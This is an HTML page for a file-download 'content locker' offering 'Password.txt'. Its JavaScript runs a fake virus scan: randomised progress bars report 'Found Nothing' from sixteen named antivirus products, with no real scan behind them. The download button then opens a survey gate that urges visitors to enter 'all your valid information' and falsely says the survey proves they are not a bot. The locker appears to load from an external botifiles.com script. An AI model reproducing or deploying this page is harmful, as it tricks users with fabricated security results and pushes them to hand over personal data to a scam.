
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://ogp.me/ns/fb#">

<head>
    <title>Upload Protector | Download Password.txt</title>
    <meta ref=''>
    <meta http-equiv='content-type' content='text/html; charset=utf-8' />
    <meta name='description' content='Secure file download' />
    <meta property='og:title' content='Upload Protector | Download Password.txt' />
    <meta name="robots" content="noindex">
    <meta property='og:image' content='img/shield.png' />
    <link rel='icon' type='image/png' href='favicon.ico'>
    <script type="text/javascript" src="js/jquery-1.7.2.min.js"></script>
    <script type="text/javascript" src="https://botifiles.com/script_include.php?id=725729"></script>
    <script type="text/javascript">
        var mydate = new Date();
        var year = mydate.getFullYear();
        var day = mydate.getDay();
        var month = mydate.getMonth();
        var daym = mydate.getDate();
        if (daym < 10) daym = "0" + daym;
        var montharray = new Array("Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec")
    </script>
    <script type="text/javascript">
        var currentTime = new Date();
        var hours = currentTime.getHours();
        var minutes = currentTime.getMinutes();
        if (minutes < 10) minutes = "0" + minutes;
        zminutes = minutes - 2;
        if (zminutes < 10) zminutes = "0" + zminutes;
    </script>
    <script type="text/javascript">
        function randomFromTo(from, to) {
            var numb = Math.floor(Math.random() * (to - from + 1) + from);
            return numb;
        }
        var totalScans, totalDone;

        function start() {
            var targetDOM = $('.scanStatus');
            $('#download_button').button('loading');
            totalDone = 0;
            totalScans = targetDOM.length;
            targetDOM.each(function() {
                preformScan($(this));
            });
        }

        function preformScan(dom) {
            var state = dom.attr("state");
            var rand = randomFromTo(1, 100);
            if (state == "waitingScan") {
                if (rand > 73) {
                    var progressDiv = dom.find(".progress");
                    dom.find(".waitingScan").css('display', 'none');
                    progressDiv.find('.bar').text("Analysing...");
                    progressDiv.css('display', 'block');
                    dom.attr("state", "progress");
                }
            } else if (state == "progress") {
                if (rand > 55) {
                    var progressBar = dom.find(".bar");
                    var progressVal = parseInt(progressBar.attr("data-percentage"));
                    var increase = 0;
                    if (100 - progressVal < 9) increase = 100 - progressVal;
                    else increase = randomFromTo(1, 8);
                    var newVal = increase + progressVal;
                    progressBar.width(newVal);
                    progressBar.attr("data-percentage", newVal);
                    if (newVal >= 100) {
                        dom.find(".progress").css('display', 'none');
                        dom.find(".foundNothing").css('display', 'block');
                        dom.attr("state", "foundNothing");
                    }
                }
            } else if (state == "foundNothing") {
                dom.attr("state", "complete");
                totalDone++;
                if (totalDone >= totalScans) scansComplete();
            }
            if (state != "complete") setTimeout(function() {
                preformScan(dom)
            }, randomFromTo(150, 300));
        }

        function scansComplete() {
            downloadButton = $("#download_button");
            downloadButton.button('reset');
            downloadButton.removeClass("disabled").removeClass("btn-danger").addClass("btn-success");
            downloadButton.attr("onclick","call_locker();");
            $("#status").html('<strong><span class="badge badge-success">0</span> viruses found.')
        }

        function pageLoadComplete() {
            start();
            return false;
        }

        function offerComplete(){
            downloadButton.attr("onclick","location.href='download.php?uid=e05602e435b3e43eb8db884d1db8f3e0&filename=Password.txt'");
        }

    </script>
    <link rel="stylesheet" href="css/bootstrap.css" />
    <link rel="stylesheet" href="css/override.css" />
    <link rel='stylesheet' id='google_font_open_sans-css' href='https://fonts.googleapis.com/css?family=Open+Sans%3A400%2C700%2C300&amp;ver=3.5.1' type='text/css' media='all' />
    <style type="text/css">
        #p1 {
            color: grey;
            font-size: 3;
            padding-top: 5px;
        }
        
        #cfModal {
            width: 940px;
            margin: -290px 0 0 -450px;
        }
        
        .scan {
            font-size: 12px;
            padding-left: 100px;
            padding-right: 100px;
            padding-top: 20px;
            padding-bottom: 20px;
            height: 280px;
            margin-bottom: 30px;
            font-weight: 200;
            line-height: 30px;
            color: inherit;
            background-color: #eeeeee;
            -webkit-border-radius: 6px;
            -moz-border-radius: 6px;
            border-radius: 6px;
        }
        
        #left-table {
            float: left;
        }
        
        #right-table {
            float: right;
        }
        
        #result {
            display: none;
        }
        
        .left-info {
            width: 390px;
            height: 120;
            margin-left: 35px;
            margin-top: 25px;
            float: left;
        }
        
        .right-info {
            width: 440px;
            height: 120;
            margin-right: 20px;
            margin-top: 25px;
            float: right;
        }
        
        .btn-large {
            font-size: 24px;
        }
        
        .progress {
            height: 25px;
            margin: 0px;
        }
        
        .bar {
            font-weight: bold;
            text-align: center;
        }
        
        .fileIconImage,
        .imageContainer {
            display: inline;
            vertical-align: middle;
            margin-top: -9px;
        }
        
        .long_text {
            font-family: 'Open Sans', Arial, sans-serif;
            font-size: 16px;
            color: #4c4c4c;
            line-height: 24px;
            margin: 6px 9px;
        }
    </style>
</head>

<body onload="pageLoadComplete();">
    <center><img src="img/logo.png" Alt="Upload Protector | Download Password.txt" /></center>
    <div class="container">
        <div class="navbar">
            <div class="navbar-inner" style="border-radius: 0"> <a class="brand" href="#">Virus Scan &raquo; <small>Password.txt</small> </a> </div>
        </div>
        <div class="row" style="margin: 0;background: #fff;padding: 0 10px;">
            <table class="table left-info">
                <tbody>
                    <tr>
                        <td>Uploaded:</td>
                        <td>
        </div><strong>                <script type="text/javascript">document.write(daym+"-"+montharray[month]+"-"+year)  </script>                                               </strong>
        <br>
        </td>
        </tr>
        <tr>
            <td>File size:</td>
            <td><strong>0.5 KB</strong></td>
        </tr>
        <tr>
            <td># Downloads:</td>
            <td><strong>0</strong></td>
        </tr>
        <tr>
            <td>Status:</td>
            <td id='status'><strong>Starting Scan...</strong></td>
        </tr>
        </tbody>
        </table>
        <table class='table right-info'>
            <tbody>
                <tr>
                    <td style="padding-top: 15px;border-top: none;"><img src="img/file_icons/txt.png" class="fileIconImage"><strong>Password.txt</strong></td>
                </tr>
                <tr>
                    <td>
                        <center> <a class="btn btn-danger btn-large disabled" data-loading-text="Scanning.." id="download_button" onClick="">Download File</a> <a class="btn btn-large" href="#helpModal" data-toggle="modal">Help</a> </center>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>
    <hr/>
    <div class="scan">
        <div id="left-table">
            <table class="waiting-for-scan" cellspacing="0">
                <tbody>
                    <tr style='height:30px;'>
                        <td style='width:90px;'> <img src='img/antivir.png' /> </td>
                        <td style='width: 110px;'>
                            <div id="table-date">
                                <script type="text/javascript">
                                    document.write(daym + "-" + montharray[month] + "-" + year)
                                </script>
                            </div>
                        </td>
                        <td align='right' style='width:130px;' class='scanStatus' state='waitingScan' id=6> <span class='waitingScan'>Waiting for scan...</span>
                            <div class="progress active progress-striped" style="width:100px; display:none;">
                                <div class="bar" style="float: left; width: 0; " data-percentage="0"></div>
                            </div> <span class='label label-success foundNothing' style='display:none;text-align: center;'>Found Nothing</span> </td>
                    </tr>
                    <tr style='height:30px;'>
                        <td style='width:90px;'> <img src='img/avast.png' /> </td>
                        <td style='width:110px;'>
                            <div id="table-date">
                                <script type="text/javascript">
                                    document.write(daym + "-" + montharray[month] + "-" + year)
                                </script>
                            </div>
                        </td>
                        <td align='right' style='width:105px;' class='scanStatus' state='waitingScan' id=5> <span class='waitingScan'>Waiting for scan...</span>
                            <div class="progress active progress-striped" style="width:100px; display:none;">
                                <div class="bar" style="float: left; width: 0; " data-percentage="0"></div>
                            </div> <span class='label label-success foundNothing' style='display:none;text-align: center;'>Found Nothing</span> </td>
                    </tr>
                    <tr style='height:30px;'>
                        <td style='width:90px;'> <img src='img/avg.png' /> </td>
                        <td style='width:110px;'>
                            <div id="table-date">
                                <script type="text/javascript">
                                    document.write(daym + "-" + montharray[month] + "-" + year)
                                </script>
                            </div>
                        </td>
                        <td align='right' style='width:105px;' class='scanStatus' state='waitingScan' id=2> <span class='waitingScan'>Waiting for scan...</span>
                            <div class="progress active progress-striped" style="width:100px; display:none;">
                                <div class="bar" style="float: left; width: 0; " data-percentage="0"></div>
                            </div> <span class='label label-success foundNothing' style='display:none;text-align: center;'>Found Nothing</span> </td>
                    </tr>
                    <tr style='height:30px;'>
                        <td style='width:90px;'> <img src='img/bitdefender.png' /> </td>
                        <td style='width:110px;'>
                            <div id="table-date">
                                <script type="text/javascript">
                                    document.write(daym + "-" + montharray[month] + "-" + year)
                                </script>
                            </div>
                        </td>
                        <td align='right' style='width:105px;' class='scanStatus' state='waitingScan' id=8> <span class='waitingScan'>Waiting for scan...</span>
                            <div class="progress active progress-striped" style="width:100px; display:none;">
                                <div class="bar" style="float: left; width: 0; " data-percentage="0"></div>
                            </div> <span class='label label-success foundNothing' style='display:none;text-align: center;'>Found Nothing</span> </td>
                    </tr>
                    <tr style='height:30px;'>
                        <td style='width:90px;'> <img src='img/clamav.png' /> </td>
                        <td style='width:110px;'>
                            <div id="table-date">
                                <script type="text/javascript">
                                    document.write(daym + "-" + montharray[month] + "-" + year)
                                </script>
                            </div>
                        </td>
                        <td align='right' style='width:105px;' class='scanStatus' state='waitingScan' id=4> <span class='waitingScan'>Waiting for scan...</span>
                            <div class="progress active progress-striped" style="width:100px; display:none;">
                                <div class="bar" style="float: left; width: 0; " data-percentage="0"></div>
                            </div> <span class='label label-success foundNothing' style='display:none;text-align: center;'>Found Nothing</span> </td>
                    </tr>
                    <tr style='height:30px;'>
                        <td style='width:90px;'> <img src='img/drweb.png' /> </td>
                        <td style='width:110px;'>
                            <div id="table-date">
                                <script type="text/javascript">
                                    document.write(daym + "-" + montharray[month] + "-" + year)
                                </script>
                            </div>
                        </td>
                        <td align='right' style='width:105px;' class='scanStatus' state='waitingScan' id=7> <span class='waitingScan'>Waiting for scan...</span>
                            <div class="progress active progress-striped" style="width:100px; display:none;">
                                <div class="bar" style="float: left; width: 0; " data-percentage="0"></div>
                            </div> <span class='label label-success foundNothing' style='display:none;text-align: center;'>Found Nothing</span> </td>
                    </tr>
                    <tr style='height:30px;'>
                        <td style='width:90px;'> <img src='img/fprot.png' /> </td>
                        <td style='width:110px;'>
                            <div id="table-date">
                                <script type="text/javascript">
                                    document.write(daym + "-" + montharray[month] + "-" + year)
                                </script>
                            </div>
                        </td>
                        <td align='right' style='width:105px;' class='scanStatus' state='waitingScan' id=1> <span class='waitingScan'>Waiting for scan...</span>
                            <div class="progress active progress-striped" style="width:100px; display:none;">
                                <div class="bar" style="float: left; width: 0; " data-percentage="0"></div>
                            </div> <span class='label label-success foundNothing' style='display:none;text-align: center;'>Found Nothing</span> </td>
                    </tr>
                    <tr style='height:30px;'>
                        <td style='width:90px;'> <img src='img/fsecure.png' /> </td>
                        <td style='width:110px;'>
                            <div id="table-date">
                                <script type="text/javascript">
                                    document.write(daym + "-" + montharray[month] + "-" + year)
                                </script>
                            </div>
                        </td>
                        <td align='right' style='width:105px;' class='scanStatus' state='waitingScan' id=3> <span class='waitingScan'>Waiting for scan...</span>
                            <div class="progress active progress-striped" style="width:100px; display:none;">
                                <div class="bar" style="float: left; width: 0; " data-percentage="0"></div>
                            </div> <span class='label label-success foundNothing' style='display:none;text-align: center;'>Found Nothing</span> </td>
                    </tr>
                </tbody>
            </table>
        </div>
        <div id="right-table">
            <table class="waiting-for-scan" cellspacing="0">
                <tbody>
                    <tr style='height:30px;'>
                        <td style='width:90px;'> <img src='img/gdata.png' /> </td>
                        <td style='width:110px;'>
                            <div id="table-date">
                                <script type="text/javascript">
                                    document.write(daym + "-" + montharray[month] + "-" + year)
                                </script>
                            </div>
                        </td>
                        <td align='right' style='width:130px;' class='scanStatus' state='waitingScan' id=12> <span class='waitingScan'>Waiting for scan...</span>
                            <div class="progress active progress-striped" style="width:100px; display:none;">
                                <div class="bar" style="float: left; width: 0; " data-percentage="0"></div>
                            </div> <span class='label label-success foundNothing' style='display:none;text-align: center;'>Found Nothing</span> </td>
                    </tr>
                    <tr style='height:30px;'>
                        <td style='width:90px;'> <img src='img/ikarus.png' /> </td>
                        <td style='width:110px;'>
                            <div id="table-date">
                                <script type="text/javascript">
                                    document.write(daym + "-" + montharray[month] + "-" + year)
                                </script>
                            </div>
                        </td>
                        <td align='right' style='width:105px;' class='scanStatus' state='waitingScan' id=9> <span class='waitingScan'>Waiting for scan...</span>
                            <div class="progress active progress-striped" style="width:100px; display:none;">
                                <div class="bar" style="float: left; width: 0; " data-percentage="0"></div>
                            </div> <span class='label label-success foundNothing' style='display:none;text-align: center;'>Found Nothing</span> </td>
                    </tr>
                    <tr style='height:30px;'>
                        <td style='width:90px;'> <img src='img/kaspersky.png' /> </td>
                        <td style='width:110px;'>
                            <div id="table-date">
                                <script type="text/javascript">
                                    document.write(daym + "-" + montharray[month] + "-" + year)
                                </script>
                            </div>
                        </td>
                        <td align='right' style='width:105px;' class='scanStatus' state='waitingScan' id=11> <span class='waitingScan'>Waiting for scan...</span>
                            <div class="progress active progress-striped" style="width:100px; display:none;">
                                <div class="bar" style="float: left; width: 0; " data-percentage="0"></div>
                            </div> <span class='label label-success foundNothing' style='display:none;text-align: center;'>Found Nothing</span> </td>
                    </tr>
                    <tr style='height:30px;'>
                        <td style='width:90px;'> <img src='img/nod32.png' /> </td>
                        <td style='width:110px;'>
                            <div id="table-date">
                                <script type="text/javascript">
                                    document.write(daym + "-" + montharray[month] + "-" + year)
                                </script>
                            </div>
                        </td>
                        <td align='right' style='width:105px;' class='scanStatus' state='waitingScan' id=15> <span class='waitingScan'>Waiting for scan...</span>
                            <div class="progress active progress-striped" style="width:100px; display:none;">
                                <div class="bar" style="float: left; width: 0; " data-percentage="0"></div>
                            </div> <span class='label label-success foundNothing' style='display:none;text-align: center;'>Found Nothing</span> </td>
                    </tr>
                    <tr style='height:30px;'>
                        <td style='width:90px;'> <img src='img/panda.png' /> </td>
                        <td style='width:110px;'>
                            <div id="table-date">
                                <script type="text/javascript">
                                    document.write(daym + "-" + montharray[month] + "-" + year)
                                </script>
                            </div>
                        </td>
                        <td align='right' style='width:105px;' class='scanStatus' state='waitingScan' id=16> <span class='waitingScan'>Waiting for scan...</span>
                            <div class="progress active progress-striped" style="width:100px; display:none;">
                                <div class="bar" style="float: left; width: 0; " data-percentage="0"></div>
                            </div> <span class='label label-success foundNothing' style='display:none;text-align: center;'>Found Nothing</span> </td>
                    </tr>
                    <tr style='height:30px;'>
                        <td style='width:90px;'> <img src='img/quickheal.png' /> </td>
                        <td style='width:110px;'>
                            <div id="table-date">
                                <script type="text/javascript">
                                    document.write(daym + "-" + montharray[month] + "-" + year)
                                </script>
                            </div>
                        </td>
                        <td align='right' style='width:105px;' class='scanStatus' state='waitingScan' id=10> <span class='waitingScan'>Waiting for scan...</span>
                            <div class="progress active progress-striped" style="width:100px; display:none;">
                                <div class="bar" style="float: left; width: 0; " data-percentage="0"></div>
                            </div> <span class='label label-success foundNothing' style='display:none;text-align: center;'>Found Nothing</span> </td>
                    </tr>
                    <tr style='height:30px;'>
                        <td style='width:90px;'> <img src='img/sophos.png' /> </td>
                        <td style='width:110px;'>
                            <div id="table-date">
                                <script type="text/javascript">
                                    document.write(daym + "-" + montharray[month] + "-" + year)
                                </script>
                            </div>
                        </td>
                        <td align='right' style='width:105px;' class='scanStatus' state='waitingScan' id=13> <span class='waitingScan'>Waiting for scan...</span>
                            <div class="progress active progress-striped" style="width:100px; display:none;">
                                <div class="bar" style="float: left; width: 0; " data-percentage="0"></div>
                            </div> <span class='label label-success foundNothing' style='display:none;text-align: center;'>Found Nothing</span> </td>
                    </tr>
                    <tr style='height:30px;'>
                        <td style='width:90px;'> <img src='img/vba32.png' /> </td>
                        <td style='width:110px;'>
                            <div id="table-date">
                                <script type="text/javascript">
                                    document.write(daym + "-" + montharray[month] + "-" + year)
                                </script>
                            </div>
                        </td>
                        <td align='right' style='width:105px;' class='scanStatus' state='waitingScan' id=14> <span class='waitingScan'>Waiting for scan...</span>
                            <div class="progress active progress-striped" style="width:100px; display:none;">
                                <div class="bar" style="float: left; width: 0; " data-percentage="0"></div>
                            </div> <span class='label label-success foundNothing' style='display:none;text-align: center;'>Found Nothing</span> </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
    <div id="cfModal" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
        <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"><i class="icon-remove-sign"></i></button>
            <div class="imageContainer"><img src="img/file_icons/txt.png" class="fileIconImage" /></div><strong>Show Password</strong> </div>
        <div class="modal-body" style="text-align: center">
            <h5>Please complete a quick survey to download this file:</h5>
            <br> </div>
        <center>
            <div id="offer_window"></div>
        </center>
        <div class="row noMargin" style="background: white;margin: 0;margin-left: 110px;">
            <div class="span3">
                <p class="muted"><img src="img/arrow_up_64.png" class="pull-left" />Input all your valid information in the survey! </p>
            </div>
            <div class="span3">
                <p class="muted"><img src="img/app_lock_64.png" class="pull-left" />Once completed, the download will automatically unlock! </p>
            </div>
            <div class="span3">
                <p class="muted"><img src="img/bulb_off_64.png" class="pull-left" />Your download will then start! </p>
            </div>
        </div>
        <div class="modal-footer">
            <button class="btn btn-warning" data-dismiss="modal">Close</button>
        </div>
    </div>
    <div id="helpModal" class="modal hide fade in" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false">
        <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"><i class="icon-remove-sign"></i></button>
            <h3>Download Help</h3> </div>
        <div class="modal-body long_text">
            <p> Our secure downloading platform gives a free and easy virus scan before you download your file! Once the virus scan is complete, you will be asked to take a quick survey before your file is unlocked. </p>
            <p> The survey serves two purposes. First, by completing a survey, you are proving that you are not a bot or machine. Second, the survey helps support our free download platform. </p>
        </div>
        <div class="modal-footer">
            <button class="btn" data-dismiss="modal" aria-hidden="true">Close</button>
        </div>
    </div>
    <script src="js/bootstrap.min.js"></script>


</body>
